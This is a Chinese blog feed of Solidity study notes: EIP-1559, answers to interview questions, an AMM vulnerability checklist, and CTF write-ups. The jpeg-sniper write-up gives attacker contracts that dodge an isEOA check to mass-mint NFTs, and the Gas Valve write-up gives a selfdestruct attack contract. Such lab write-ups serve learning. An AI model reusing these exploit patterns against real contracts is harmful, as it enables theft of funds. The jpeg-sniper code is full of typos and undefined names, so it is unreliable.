        <content type="html"><![CDATA[<h2 id="EIP-1559"><a href="#EIP-1559" class="headerlink" title="EIP-1559"></a>EIP-1559</h2><p>在做solidity自我检测的时候,第一次,了解到这个协议,就来做个学习笔记</p><h1 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h1><p>首先它是由V神和Ethhub_io创始人Eric Conner于2019年3月联合提出的以太坊交易手续费机制改进提案。这个提案的主要内容就是对向矿工的支付的gas方式做出了改变,它将gas费分为俩部分:基础费(basefee)+矿工小费</p><p>基础费(basefee)就是以太坊网络根据交易需求和区块大小动态调整的。<code>BASEFEE</code>的计算方式是通过一个名为“基础费用追踪器”的算法来实现的。该算法会根据当前区块的交易需求和区块大小来动态调整<code>BASEFEE</code>，以确保交易能够在合理的时间内得到确认。</p><p>EIP-1559协议的核心思想其实有两块：第一块是变更燃料费价格的定价方式，降低整体的燃料费价格，以利于以太坊生态中的各种应用的发展。第二块是原来的以太坊网络中的燃料费全部是矿工的收入，在EIP-1559协议实施后，燃料费的一部分将燃烧掉，不再作为矿工的收入。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>降低以太坊的矿工费用,维持以太坊网络的稳定</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>solidityqestion答案</title>
      <link href="/2024/10/20/solidityqestion%E7%AD%94%E6%A1%88/"/>
      <url>/2024/10/20/solidityqestion%E7%AD%94%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="自查"><a href="#自查" class="headerlink" title="自查"></a>自查</h2><p>最近发现个关于solidity面试的问题网站，正好之前又重新温习了solidity的，所以就来做一下<br><a href="https://www.rareskills.io/post/solidity-interview-questions">点击</a>查看面试问题网站</p><h3 id="容易"><a href="#容易" class="headerlink" title="容易"></a>容易</h3><p>1，私有、内部、公共和外部函数之间有什么区别？</p><ul><li><code>private</code>表示只能在合同内部调用其他函数。 <code>internal</code>类似于私有关键字，但也可由继承当前合同的合同调用。 <code>external</code>只能在合同外部调用。<code> public</code>可在任何地方被调用，无论是内部还是外部。</li></ul><p>2，智能合约大约可以有多大？</p><ul><li>24KB</li></ul><p>3，create 和 create2 有什么区别？</p><ul><li>首先它们都是Solidity中重要的操作码，都是用来部署合约的，区别就是，<strong>create</strong>是通过对发送者地址和nonce值进行哈希运算计算新合约的地址的，<code>keccak256(rlp.encode(deployingAddress, nonce))</code>。而<strong>create2</strong>更为复杂，它使用是通过一个公式计算新合约的地址的，这个公式包括，发送者地址，随机数，salt，字节码等参数，<code>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))</code>，它也有个优点，可以在部署合约之前预测合约地址。</li></ul><p>4，Solidity 0.8.0 版本对算术运算有什么重大变化？</p><ul><li>里面有对整数溢出做出了一个保护</li></ul><p>5，代理需要哪种特殊的 <code>CALL</code> 才能工作？</p><ul><li>一般来说是：<code>delegatecall</code>，因为它主要用于委托调用，允许我们在主合约的上下文中加载和调用另一个合约的代码。被调用合约的代码被执行，但被调用合约所做的任何状态改变实际上是在主合约的存储中进行的，而不是在被调用合约的存储中</li></ul><p>6，在 EIP-1559 之前，如何计算以太坊交易的成本？</p><blockquote><p><code>Ethereum Improvement Proposal (EIP) 1559</code>是以太坊的一个升级，旨在改变以太坊计算和处理网络交易费用（称为“gas费用”）的方式。该升级通过使用基于区块的基础费用<code>basefee</code>和发送方指定的最大费用，而不是对gas价格进行竞价，来更加平衡地激励矿工在高或低网络拥塞期间进行挖矿，从而使以太坊交易更加高效。EIP-1559是一个提案，它改变了gas费用的结构和矿工的奖励方式。该提案于2021年8月5日作为以太坊伦敦硬分叉的一部分实施。<br>gas费 &#x3D; 基础费（<code>Basefee</code>）+ 矿工费（Tip），基础费会根据区块的Gas利用率动态调整，如每个区块的Gas费利用率低于50%，就降低手续费，高于50%，就提高手续费。</p></blockquote><ul><li>关于<a href="https://learnblockchain.cn/article/6914">EIP-1559</a>,可以查看。以以太坊的交易成本有矿工通过拍卖机制来决定的，矿工会选出价高的交易，并将其包含在下一个区块上，交易成本，又俩个因素决定，GasPrice和<code>Gas Limit</code>,<code>Gas Price</code>是以太坊网络中的一种计量单位，用于衡量交易的复杂性。<code>Gas Limit</code>是指交易可以使用的最大Gas数量。交易的成本等于<code>Gas Price</code>乘以Gas Limit。因此，交易的成本取决于<code>Gas Price</code>和<code>Gas Limit</code>的值，这些值由交易的发送者设置。</li></ul><p>7，在区块链上创建随机数有哪些挑战</p><ul><li>不可预测，而且比较困难，因为所有矿工都在一个链上，它们有个共同的共识，如果随意产生伪随机数，那么就可能会导致达不成共识。</li></ul><p>8，荷兰拍卖会和英国拍卖会有什么区别</p><ul><li>这个问感觉和slidity没有太多关系,就不回答了</li></ul><p>9,ERC20 中的 和 有什么区别？<code>transfer</code>和<code>transferFrom</code></p><ul><li><code>transfer</code>是用户直接发送,<code>transferForm</code>是对于用户授权地址进行发送代币,用户可以不用直接参</li><li><code>transfer(address recipient, uint256 amount)</code></li><li><code>transferFrom(address sender, address recipient, uint256 amount)</code></li><li>从上面的表达式也能看出,<code>transfer</code>是直接从当前合约转账给目标合约,<code>transferFrom</code>是可以设置发送账户和目标账户的</li></ul><p>10,哪个更适合用于地址允许列表：映射还是数组？为什么</p><ul><li>数组是可以快速历遍地址列表,而映射可以快速查找地址是否在地址列表中,所以要根据具体的使用情况来决定使用谁</li></ul><p>11,为什么不应该使用 <code>tx.origin</code> 进行身份验证？</p><ul><li><code>tx.origin</code>是发起交易的的人,在 Solidity 中，<code>tx.origin </code>是一个全局变量，它返回发送交易的账户地址。在合约代码中，最常用的是使用 <code>msg.sender </code>来检查授权，但有时由于有些程序员不熟悉 <code>tx.origin </code>和 <code>msg.sender</code> 的区别，如果使用了 <code>tx.origin </code>可能导致合约的安全问题。黑客最典型的攻击场景是利用 <code>tx.origin </code>的代码问题常与钓鱼攻击相结合的组合拳的方式进行攻击。因为 <code>tx.origin </code>返回交易的原始发送者，因为攻击的调用链可能是原始发送者 -&gt; 攻击合约 -&gt; 受攻击合约。在受攻击合约中，<code>tx.origin</code> 是原始发送者。因此，通过调用 <code>tx.origin</code> 来检查授权可能会导致合约受到攻击。为了避免这种情况，建议使用 <code>msg.sender</code> 来检查授权</li></ul><p>12,1 个Ether 相当于 多少个 gwei ？</p><ul><li>1 ether &#x3D; 10^9gwei</li></ul><p>13,1 个Ether 相当于 多少个 wei ？</p><ul><li>1 ether &#x3D; 10^18wei</li></ul><p>14,<code>assert</code> 和 <code>require</code> 之间有什么区别？</p><ul><li><code>require</code> 应该被用于函数中检查条件，<code>assert</code>用于预防不应该发生的情况，即不应该使条件错误。</li></ul><p>15,什么是闪电贷？</p><ul><li>就是无需抵押,就可以借钱,允许在一笔交易中还款</li></ul><p>16,什么是 <code>check-effects-interaction</code> 模式？</p><ul><li><code>Checks-Effects-Interactions</code>模式确保所有通过合约的代码路径在修改合约的状态（<code>Checks</code>）之前完成对所提供的参数的所有必要检查；然后才对状态（<code>Effects</code>）进行任何改变。 在所有计划中的状态变化被写入存储空间之后，它可以调用其他合约中的函数（<code>Interactions</code>）。检查-生效-交互</li></ul><p>17,运行一个单独的质押节点所需的最低以太币数量是多少？</p><ul><li>32个以太币</li></ul><p>18,<code>fallback</code> 和 <code>receive</code> 之间有什么区别？</p><ul><li><code>fallback</code>和<code>receive</code>都是特殊的回调函数，用于处理合约中不存在的函数调用和接收以太币。它们之间的区别在于，<code>fallback</code>函数会在调用合约不存在的函数时被触发，而<code>receive</code>函数只用于处理接收以太币。</li></ul><p>19,如何向没有<code>payable </code>函数、<code>receive </code>或回退的合约发送以太？</p><ul><li>通过自毁合约,将自毁的eth发送给目标合约</li></ul><p>20, <code>view</code> 和 <code>pure </code>之间有什么区别？</p><ul><li><code>view</code>和<code>pure</code>都是函数的修饰符，view可以访问合约中的状态变量，不能修改；<code>pure</code>不能访问也不能修改状态变量。</li></ul><p>21,访问控制是什么，为什么重要？</p><ul><li>访问控制是一种重要的机制，用于限制对智能合约的访问。通过使用访问控制，您可以确保只有经过授权的用户才能执行特定操作或访问敏感信息。这可以帮助保护您的智能合约免受未经授权的访问和攻击。Solidity提供了几种访问控制修饰符，例如<code>public</code>、<code>private</code>、<code>internal</code>和<code>external</code>。这些修饰符用于控制函数和状态变量的可见性和访问权限。</li></ul><p>22, uint256 可以存储的最大值是多少？</p><ul><li>2^256-1</li></ul><p>23,修饰符（modifier）的作用是什么？</p><ul><li>增加对函数的限制或者修饰</li></ul><hr><h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><p>1, <code>transfer </code>和 <code>send </code>之间有什么区别？为什么不应该使用它们？</p><ul><li><code>transfer</code>和<code>send</code>函数都是用于将以太币从一个地址转移到另一个地址的函数。它们之间的区别在于它们的<code>gas</code>限制不同，这可能会导致一些安全问题。因此，您应该使用<code>call</code>函数来转移以太币,但是会有重入攻击风险。<blockquote><p>（transfer函数的gas限制为2300 gas，这意味着如果接收方合约没有实现fallback函数，或者fallback函数消耗的gas超过了2300，那么转账将失败并回滚所有更改。这可以防止重入攻击，但也可能导致一些问题，例如无法向某些合约发送以太币。<br>send函数的gas限制也为2300 gas，但它返回一个布尔值，指示转账是否成功。如果转账失败，它将返回false。但是，如果接收方合约没有实现fallback函数，或者fallback函数消耗的gas超过了2300，那么转账将失败并回滚所有更改。<br>由于这些限制，transfer和send函数已经被认为是不安全的，因此不应该使用它们。相反，您应该使用call函数来转移以太币。call函数没有gas限制，可以向任何地址发送以太币，并且可以指定要发送的gas数量。但是，您应该小心使用call函数，因为它可能会导致一些安全问题，例如重入攻击。）</p></blockquote></li></ul><p>2,代理合约中的存储冲突是什么？</p><ul><li>存储冲突是指多个合约尝试访问同一存储位置时发生的问题。当多个合约同时尝试更新同一存储位置时，可能会发生存储冲突，导致数据不一致或合约无法正常工作。</li></ul><p>3,在权益证明之前后，<code>block.timestamp</code> 发生了什么变化？</p><ul><li>在PoW协议中，<code>block.timestamp</code>表示矿工开始挖掘新块的时间戳。在PoS协议中，<code>block.timestamp</code>表示验证器开始验证新块的时间戳。</li></ul><p>4,什么是抢跑（frontrunning）？</p><ul><li>抢跑就是抢先在别人的交易的执行前执行,它是通过提交更高的gas费用来达到的</li></ul><p>5,以太坊如何确定 EIP-1559 中的 <code>BASEFEE</code></p><ul><li><code>BASEFEE</code>是由以太坊网络根据交易需求和区块大小动态调整的。<code>BASEFEE</code>的计算方式是通过一个名为“基础费用追踪器”的算法来实现的。该算法会根据当前区块的交易需求和区块大小来动态调整<code>BASEFEE</code>，以确保交易能够在合理的时间内得到确认。</li></ul><p>6,什么是 <code>commit-reveal</code> 方案，何时使用它？</p><ul><li>提交-揭示方案（<code>Commit-Reveal Scheme</code>）是一种用于在区块链上进行投票或竞标的协议。该协议的目的是防止参与者在提交投票或竞标之前查看其他参与者的提交，从而保护投票或竞标的公正性。</li></ul><p>7,在什么情况下，<code>abi.encodePacked</code> 可能会产生漏洞？</p><ul><li><code> abi.encodePacked</code>可能会产生漏洞，因为它不会在参数之间添加填充，而是将所有参数拼接在一起。这可能会导致哈希碰撞，从而使攻击者能够伪造交易或执行其他恶意操作。例如，如果攻击者知道您使用<code>abi.encodePacked</code>来编码交易数据，他们可以构造一个具有相同哈希值的交易，从而欺骗您的智能合约。</li></ul><p>8,AMM 如何定价资产？</p><ul><li>通过恒定乘积算法，a * b &#x3D; k ,兑换 m个a 需要的b数量算法 &#x3D; k&#x2F;(a+m) - b ,这里没计算手续费。</li></ul><p>9, 函数参数中的 memory 和 calldata 有什么区别？</p><ul><li>memory：用于声明函数参数将被存储在内存中。内存中的数据只在函数执行期间存在，执行完毕后就被销毁。在函数内部，您可以使用memory关键字来创建临时变量，但是不能在函数之外使用它们。在函数调用期间，函数参数的值将从调用方复制到内存中，并在函数执行完毕后被销毁。<br>calldata：用于声明函数参数将被存储在调用数据区域中。调用数据区域是一个不可修改的区域，用于保存函数参数。在函数内部，您可以使用calldata关键字来访问函数参数，但是不能在函数之外使用它们。在函数调用期间，函数参数的值将从调用方复制到调用数据区域中，并在函数执行完毕后被销毁</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-jpeg-sniper</title>
      <link href="/2024/10/19/CTF-jpeg-sniper/"/>
      <url>/2024/10/19/CTF-jpeg-sniper/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-jpeg-sniper"><a href="#CTF-jpeg-sniper" class="headerlink" title="CTF-jpeg-sniper"></a>CTF-jpeg-sniper</h1><p>这道题的源码在<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/main/src/jpeg-sniper">这里</a></p><p>题目的要求是：铸币</p><p>首先又是要理解这些代码想表达的意思</p><p><code>BaseLaunchpegNTF</code>合约，这个NTF的原型，里面实现了isEOA的修饰器，看到这个，我就想起了前几天才整理的智能合约的漏洞：如何绕过外部账户，实现用合约调用。接下来就是普通的铸币流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function numberMinted(address _owner)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        return balanceOf(_owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _tokenId.current();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// 每个使用者可铸币的数量</span><br><span class="line">    function _mintForUser(address to, uint256 quantity) internal &#123;</span><br><span class="line">        for (uint256 i=0; i&lt;quantity; i++) &#123;</span><br><span class="line">            _mint(to, _tokenId.current());</span><br><span class="line">            _tokenId.increment();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _refundIfOver(uint256 _price) internal &#123;</span><br><span class="line">        if (msg.value &lt; _price) &#123;</span><br><span class="line">            revert Launchpeg__NotEnoughFunds(msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">        if (msg.value &gt; _price) &#123;</span><br><span class="line">            (bool success, ) = msg.sender.call&#123;value: msg.value - _price&#125;(&quot;&quot;);</span><br><span class="line">            if (!success) &#123;</span><br><span class="line">                revert Launchpeg__TransferFailed();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>问题就是出在<code>FlatLaunchpeg</code>合约中，从这个合约中我们可以看到这个<code>publicSaleMint</code>函数,这是我们主要可以调用的铸币函数，一看，果然，有isEOA的修饰，难点也就是这个了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function publicSaleMint(uint256 _quantity)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        isEOA </span><br><span class="line">        atPhase(Phase.PublicSale)</span><br><span class="line">    &#123;</span><br><span class="line">        if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123;</span><br><span class="line">            revert Launchpeg__CanNotMintThisMany();</span><br><span class="line">        &#125;</span><br><span class="line">        if (totalSupply() + _quantity &gt; collectionSize) &#123;</span><br><span class="line">            revert Launchpeg__MaxSupplyReached();</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 total = salePrice * _quantity;</span><br><span class="line"></span><br><span class="line">        _mintForUser(msg.sender, _quantity);</span><br><span class="line">        _refundIfOver(total);</span><br><span class="line">    &#125;</span><br><span class="line">    function currentPhase() public view returns (Phase) &#123;</span><br><span class="line">        if (</span><br><span class="line">            publicSaleStartTime == 0 ||</span><br><span class="line">            block.timestamp &lt; publicSaleStartTime</span><br><span class="line">        ) &#123;</span><br><span class="line">            return Phase.NotStarted;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return Phase.PublicSale;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>联想到之前整理的漏洞，想到，可以使用在攻击合约中的构造函数调用即可,为了在一个交易完成，就写了俩个合约来实现此次的攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IFlatLaunchpeg&#123;</span><br><span class="line">   function publicSaleMint(uint256 _quantity) external payable;</span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line">    function totalSupply() external returns (uint256);</span><br><span class="line">    function maxPerAddressDuringMint() external returns (uint256);</span><br><span class="line">    function collectionSize() external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">constract hack1&#123;</span><br><span class="line">    IFlatLaunchpeg nft;</span><br><span class="line">    address attracker;</span><br><span class="line">    contructor(address _nft,address _attracker)&#123;</span><br><span class="line">        runExploit(nft,attracker);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function runExpoit (address nft,attracker) public&#123;</span><br><span class="line">         IFlatLaunchpeg nft = IFlatLaunchpeg(nftAddress);</span><br><span class="line"></span><br><span class="line">        uint256 collectionSize = nft.collectionSize();//总共的NFT</span><br><span class="line">        uint256 maxPerAddress = nft.maxPerAddressDuringMint();//每个合约地址可以铸币的最大数量</span><br><span class="line"></span><br><span class="line">        uint256 startIndex = nft.totalSupply();//已经铸币的数量，也是标识符</span><br><span class="line">        uint256 loops = (collectionSize-startIndex)/maxPerAddress;</span><br><span class="line"></span><br><span class="line">        for (uint i = 0;i&lt;maxPerAddress;i++)&#123;</span><br><span class="line">            new hack2(ntf,attracker，maxPerAddress,stratIndex);</span><br><span class="line">            startIndex +=maxPerAddress;</span><br><span class="line">        &#125;</span><br><span class="line">         //转移剩下的可以铸币的数量</span><br><span class="line">          uint256 mintRemainder = (collectionSize-startIndex)%maxPerAddress;</span><br><span class="line">        if (mintRemainder &gt; 0) new MiniJpegSniperExploiter(nft,to,mintRemainder,startIndex);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack2&#123;</span><br><span class="line">    //stratIndex 是转移的代币ID，因为每个代币被铸出来，都有一个标识ID，不要误认为是转移这么多代币</span><br><span class="line">    constructor(IFlatLaunchpeg nft,address attracker,uint256 maxPerAddress,uint256 startIndex)&#123;</span><br><span class="line">        ntf.publicSaleMint(maxPerAddress);</span><br><span class="line">        for(uint i = 0;i&lt;per;i++)&#123;</span><br><span class="line">            nft.transferFrom(address(this),attracker,startIndex+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题要想解决，就是要对铸币NFT有一些了解，执行攻击合约即可完成；</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-GasValue</title>
      <link href="/2024/10/16/CTF-GasValue/"/>
      <url>/2024/10/16/CTF-GasValue/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-GasValue"><a href="#CTF-GasValue" class="headerlink" title="CTF-GasValue"></a>CTF-GasValue</h1><p>这个题要求我们使open为faluse<br>源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">interface INozzle &#123;</span><br><span class="line">    function insert() external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @title Gas Valve</span><br><span class="line">/// @author https://twitter.com/bahurum</span><br><span class="line">/// @notice The evil Dr. N. Gas has created a machine to suck all the air out of the atmosphere. Anon, you must deactivate it before it&#x27;s too late!</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/gas-valve</span><br><span class="line">contract Valve &#123;</span><br><span class="line">    bool public open;</span><br><span class="line">    bool public lastResult;</span><br><span class="line"></span><br><span class="line">    function useNozzle(INozzle nozzle) public returns (bool) &#123;</span><br><span class="line">        try nozzle.insert() returns (bool result) &#123;</span><br><span class="line">            lastResult = result;</span><br><span class="line">            return result;</span><br><span class="line">        &#125; catch &#123;</span><br><span class="line">            lastResult = false;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function openValve(INozzle nozzle) external &#123;</span><br><span class="line">        open = true;</span><br><span class="line">        (bool success,) = address(this).call(abi.encodeWithSelector(this.useNozzle.selector, nozzle));</span><br><span class="line">        require(!success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看到这个题的时候，发现前俩天才在java课上学习到了try catch的抛出错误的用法，今天就在solidity中看见了，只不过Java中try catch不仅检查自己本身程序是否有异常，还多个finally的用法，而solidity中，try catch用法主要处理调用外部函数的异常</p><p>分析题目：有接口<code>INozzle</code>,try catch 主要就是检查调用接口中insert函数是否有错误，然后看到openValue函数中居然把opend设置为false,而我有没有发现如何才能改变opend值的地方，就陷入了困境，于是看了一下别人的思路，原来这道题的关键点是如何消耗完gas,并且不会抛出异常，查看这个<a href="https://ethereum.stackexchange.com/questions/594/how-do-gas-refunds-work">问答</a>,了解到Gas refunds are provided when clearing storage or calling on contracts.SELFDESTRUCT，所以我们就可以在调用insert函数中，使用自毁合约，退回gas费用，并且不会抛出错误<br>攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract ValveHacker &#123;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function insert() public returns (bool result) &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMM漏洞分析</title>
      <link href="/2024/10/16/AMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/16/AMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="是否使用硬编码滑点"><a href="#是否使用硬编码滑点" class="headerlink" title="是否使用硬编码滑点"></a>是否使用硬编码滑点</h3><p>在高波动时期，使用硬编码滑点会导致交易不佳并冻结用户资金</p><h3 id="有截止日期保护吗"><a href="#有截止日期保护吗" class="headerlink" title="有截止日期保护吗"></a>有截止日期保护吗</h3><p>如果没有截至日期保护，用户交易衡容易收到Sandwich攻击</p><h3 id="是否针对协议储备的验证检查"><a href="#是否针对协议储备的验证检查" class="headerlink" title="是否针对协议储备的验证检查"></a>是否针对协议储备的验证检查</h3><p>如果储备金未经验证，协议可能会面临风险，并且可以借出，从而影响系统的偿付能力。</p><h3 id="AMM是否使用分叉代码"><a href="#AMM是否使用分叉代码" class="headerlink" title="AMM是否使用分叉代码"></a>AMM是否使用分叉代码</h3><p>如果使用了分叉代码，尤其是来自Uniswap等已知项目的代码，并且这些代码没有进行正确更新，或者审计，可能会引入已知的漏洞</p><h3 id="产品常数公式中是否存在舍入问题"><a href="#产品常数公式中是否存在舍入问题" class="headerlink" title="产品常数公式中是否存在舍入问题"></a>产品常数公式中是否存在舍入问题</h3><p>公式中的四舍五入问题可能导致代币交换和流动性供应不准确或不平衡。</p><h3 id="是否可以根据用户输入进行任意调用"><a href="#是否可以根据用户输入进行任意调用" class="headerlink" title="是否可以根据用户输入进行任意调用"></a>是否可以根据用户输入进行任意调用</h3><p>允许基于用户输入的任意调用可能会使合约面临各种漏洞</p><h3 id="是否有适当的机制来防止过度滑点"><a href="#是否有适当的机制来防止过度滑点" class="headerlink" title="是否有适当的机制来防止过度滑点"></a>是否有适当的机制来防止过度滑点</h3><p>如果没有滑点保护，交易者可能会因交易过程中的巨大价格偏差而遭受意外损失。</p><h3 id="AMM是否正确处理不同十进制配置和令牌"><a href="#AMM是否正确处理不同十进制配置和令牌" class="headerlink" title="AMM是否正确处理不同十进制配置和令牌"></a>AMM是否正确处理不同十进制配置和令牌</h3><p>如果 AMM 不支持具有不同小数或类型的令牌，则可能会导致计算错误和潜在损失。</p><h3 id="AMM是否支持转账收费代币"><a href="#AMM是否支持转账收费代币" class="headerlink" title="AMM是否支持转账收费代币"></a>AMM是否支持转账收费代币</h3><p>转账收费代币可能会导致问题，因为发送金额和接收金额不匹配。</p><h3 id="协议是否在代币交换之前计算”minAmountOut”"><a href="#协议是否在代币交换之前计算”minAmountOut”" class="headerlink" title="协议是否在代币交换之前计算”minAmountOut”"></a>协议是否在代币交换之前计算”minAmountOut”</h3><p>集成 AMM 的协议应在掉期之前确定 ‘minAmountOut’，以避免不利的汇率。还应考虑速率的来源和操纵的可能性。</p><h3 id="集成合约是否在其回调函数中验证调用者地址"><a href="#集成合约是否在其回调函数中验证调用者地址" class="headerlink" title="集成合约是否在其回调函数中验证调用者地址"></a>集成合约是否在其回调函数中验证调用者地址</h3><p>如果回调函数不验证调用合约的地址，则可以操纵回调函数。这对于像 ‘swap（）’ 这样涉及代币或资产的函数尤其重要。</p><h3 id="在资金转移给用户之前的最后一步是否强制执行滑点参数"><a href="#在资金转移给用户之前的最后一步是否强制执行滑点参数" class="headerlink" title="在资金转移给用户之前的最后一步是否强制执行滑点参数"></a>在资金转移给用户之前的最后一步是否强制执行滑点参数</h3><p>对中间交换强制执行滑点参数，而不是最后一步，可能会导致用户收到的代币少于其指定的最小值</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击描述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMM(自动化做市商)</title>
      <link href="/2024/10/16/AMM-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9A%E5%B8%82%E5%95%86/"/>
      <url>/2024/10/16/AMM-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9A%E5%B8%82%E5%95%86/</url>
      
        <content type="html"><![CDATA[<h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><p>长话短说</p><p>你可以将自动做市商视为一个机器人，它总是愿意为你报出两种资产之间的价格。有些使用像 Uniswap 这样的简单公式，而 Curve、Balancer 和其他公司则使用更复杂的公式。</p><p>您不仅可以使用 AMM 进行无需信任的交易，还可以通过向流动性池提供流动性来成为庄家。这基本上允许任何人成为交易所的做市商，并通过提供流动性赚取费用。</p><p>由于 AMM 简单易用，它在 DeFi 领域真正占据了一席之地。以这种方式实现去中心化做市是加密货币愿景的本质。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>去中心化金融 (DeFi) 在以太坊和 BNB 智能链等其他智能合约平台上引起了人们的极大兴趣。收益耕种已成为一种流行的代币分配方式，代币化的 BTC 在以太坊上不断增长，闪电贷交易量也在蓬勃发展。</p><p>与此同时，像 Uniswap 这样的自动做市商协议经常会看到有竞争力的交易量、高流动性和不断增加的用户数量。</p><p>但是这些交易所是如何运作的呢？为什么为最新的食品币建立市场如此快速和容易？AMM 真的能与传统的订单簿交易所竞争吗？让我们来一探究竟。</p><h1 id="什么是自动化做市商（AMM）？"><a href="#什么是自动化做市商（AMM）？" class="headerlink" title="什么是自动化做市商（AMM）？"></a>什么是自动化做市商（AMM）？</h1><p>自动做市商 (AMM) 是一种去中心化交易所 (DEX) 协议，它依靠数学公式来为资产定价。与传统交易所使用订单簿不同，资产是根据定价算法来定价的。</p><p>此公式可能因每个协议而异。例如，Uniswap 使用 x * y &#x3D; k，其中 x 是流动性池中一种代币的数量，y 是另一种代币的数量。在这个公式中，k 是一个固定常数，这意味着池的总流动性必须始终保持不变。其他 AMM 将针对其针对的特定用例使用其他公式。然而，它们之间的相似之处在于它们通过算法确定价格。如果现在有点困惑，别担心；希望最终一切都会好起来。</p><p>传统做市商通常与拥有大量资源和复杂策略的公司合作。做市商可帮助您在像币安这样的订单簿交易所获得优惠价格和紧密的买卖价差。自动化做市商将这一过程去中心化，让任何人都可以在区块链上创建市场。他们究竟是如何做到这一点的？让我们继续阅读。</p><h1 id="自动化做市商（AMM）如何运作？"><a href="#自动化做市商（AMM）如何运作？" class="headerlink" title="自动化做市商（AMM）如何运作？"></a>自动化做市商（AMM）如何运作？</h1><p>AMM 的工作原理与订单簿交易所类似，因为有交易对 - 例如 ETH&#x2F;DAI。但是，您不需要在另一边有交易对手（另一个交易者）来进行交易。相反，您与“为您创造”市场的智能合约进行交互。</p><p>在像币安 DEX 这样的去中心化交易所，交易直接发生在用户钱包之间。如果您在币安 DEX 上用 BUSD 卖出 BNB，那么交易的另一端也会有人用他们的 BUSD 购买 BNB。我们可以称之为点对点 (P2P) 交易。</p><p>相比之下，你可以将 AMM 视为点对点合约 (P2C)。交易发生在用户和合约之间，因此不需要传统意义上的交易对手。由于没有订单簿，AMM 上也没有订单类型。你想买或卖的资产的价格由公式决定。不过值得注意的是，未来的一些 AMM 设计可能会抵消这一限制。</p><p>所以不需要交易对手，但还是得有人创造市场，对吧？没错。智能合约中的流动性仍然需要由被称为流动性提供者 (LP) 的用户提供。</p><h1 id="什么是流动资金池？"><a href="#什么是流动资金池？" class="headerlink" title="什么是流动资金池？"></a>什么是流动资金池？</h1><p>what is a liquidity pool</p><p>流动性提供者 (LP) 向流动性池中添加资金。你可以将流动性池视为交易者可以进行交易的一大笔资金。作为向协议提供流动性的回报，LP 可以从其池中发生的交易中赚取费用。在 Uniswap 的情况下，LP 将等值的两个代币（例如，50% 的 ETH 和 50% 的 DAI）存入 ETH&#x2F;DAI 